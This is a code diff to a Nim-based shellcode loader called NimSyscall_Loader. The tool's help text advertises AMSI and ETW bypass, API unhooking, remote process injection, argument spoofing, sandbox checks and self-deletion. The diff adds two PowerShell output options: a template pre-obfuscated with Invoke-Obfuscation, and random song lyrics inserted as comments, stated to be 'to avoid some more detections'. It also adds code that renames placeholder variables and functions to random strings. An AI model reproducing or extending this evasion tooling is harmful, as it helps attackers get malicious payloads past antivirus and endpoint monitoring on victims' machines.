@@ -64,7 +64,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.75
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -92,6 +92,8 @@ Options:
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
   --psout    Powershell Output format, reflectively loading the packed binary
+    --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation
+    --pslyrics    Add Lyrics as comments to avoid some more detections
 
 [Payload retrieval options]
 
@@ -201,6 +203,8 @@ var
     dllProxy: bool = false
     noNimMain: bool = false
     psout: bool = false
+    uselyrics: bool = false
+    psobfs: bool = false
     cpl: bool = false
     replaceNimMain: bool = false
     big: bool
@@ -287,6 +291,12 @@ if args["--key"]:
 if args["--psout"]:
     psout = true
     reflective = true
+
+if args["--psobfs"]:
+    psobfs = true
+
+if args["--pslyrics"]:
+    uselyrics = true
 
 if args["--arguments"]:
   let argsForPE = args["--arguments"]
@@ -2343,8 +2353,53 @@ proc WritePS1() =
         for i in 0..length:
             byteList.add(fmt"{bytes[i]},")
         byteList = byteList[0..^2]
-        var script: string = Powershelltemplate
+        var script: string
+        if(psobfs):
+            script = PowershellObfsTemplate
+        else:
+            script = Powershelltemplate
         script = script.replace("QWERQWERQWER", byteList)
+
+        # Now Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on
+        var words: seq[string] = @["VAR", "FUN", "CONST", "ERROR", "LYRICS"]
+        var wordlength: int = len(words) - 1
+        var maxWords: int = 999
+        for i in 0..wordlength:
+            if (words[i] == "VAR"):
+                maxWords = 380
+            elif (words[i] == "FUN"):
+                maxWords = 100
+            elif (words[i] == "CONST"):
+                maxWords = 300
+            elif (words[i] == "ERROR"):
+                maxWords = 100
+            if (words[i] == "LYRICS"):
+                var lyrics: seq[string]
+                var dictionary: string
+                when system.hostOS == "windows":
+                    dictionary = "Dicts\\lyrics.txt"
+                else:
+                    dictionary = "Dicts/lyrics.txt"
+                for line in lines dictionary:
+                    lyrics.add(line)
+                var length: int = len(lyrics) - 1
+                for j in 0..1150:
+                    var randstring: string = ""
+                    if(uselyrics):
+                        for k in 0..10:
+                            randstring.add(fmt"{lyrics[rand(0..length)]}")
+                    #echo "Replacing " & fmt"{words[i]}{j:03d}" & " with " & randstring
+                    script = script.replace(fmt"{words[i]}{j:03d}", randstring)
+            else:
+                for j in 0..maxWords:
+                    var randstring: string = rndStr(10)
+                    #echo "Replacing " & fmt"{words[i]}{j:03d}" & " with " & randstring
+                    script = script.replace(fmt"{words[i]}{j:03d}", randstring)
+            
+            
+
+
+
         writeFile(fmt"{outfile}.ps1", script)
     else:
         echo fmt"[!] File {outfile}.ps1 not found, skipping byte list creation"
